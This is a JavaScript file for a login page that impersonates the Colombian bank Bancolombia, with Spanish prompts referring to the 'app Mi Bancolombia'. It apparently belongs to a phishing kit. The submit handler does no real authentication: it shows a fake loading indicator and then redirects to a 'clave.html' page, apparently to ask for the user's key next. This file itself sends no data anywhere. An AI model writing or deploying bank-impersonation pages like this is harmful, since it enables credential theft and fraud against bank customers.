const form = document.getElementById("login-form");
const submit = document.getElementById("submit");
const fields = ["user", "password"].map((id) => document.getElementById(id));
const toast = document.getElementById("toast");
const helpCard = document.getElementById("help-card");

function filled() {
  return fields.every((field) => field.value.trim().length > 0);
}

function refresh() {
  submit.disabled = !filled();
}

fields.forEach((field) => field.addEventListener("input", refresh));

document.querySelectorAll("[data-toggle]").forEach((button) => {
  button.addEventListener("click", () => {
    const input = document.getElementById(button.dataset.toggle);
    input.type = input.type === "password" ? "text" : "password";
  });
});

function showToast(text) {
  toast.textContent = text;
  toast.hidden = false;
  window.setTimeout(() => {
    toast.hidden = true;
  }, 2800);
}

form.addEventListener("submit", (event) => {
  event.preventDefault();
  document.getElementById("svn-loader").hidden = false;
  window.setTimeout(() => {
    window.location.href = "clave.html";
  }, 1400);
});

document.getElementById("forgot-user").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("Recupera tu usuario desde la app Mi Bancolombia.");
});

document.getElementById("forgot-pass").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("Puedes regenerar tu clave desde la app o el centro de ayuda.");
});

document.getElementById("register").addEventListener("click", (event) => {
  event.preventDefault();
  showToast("El registro se hace desde la app Mi Bancolombia.");
});

function toggleHelp() {
  helpCard.hidden = !helpCard.hidden;
}

document.getElementById("btn-ayuda").addEventListener("click", toggleHelp);
document.getElementById("need-help").addEventListener("click", toggleHelp);

document.addEventListener("click", (event) => {
  if (!event.target.closest("#help-card, #btn-ayuda, #need-help")) {
    helpCard.hidden = true;
  }
});

refresh();
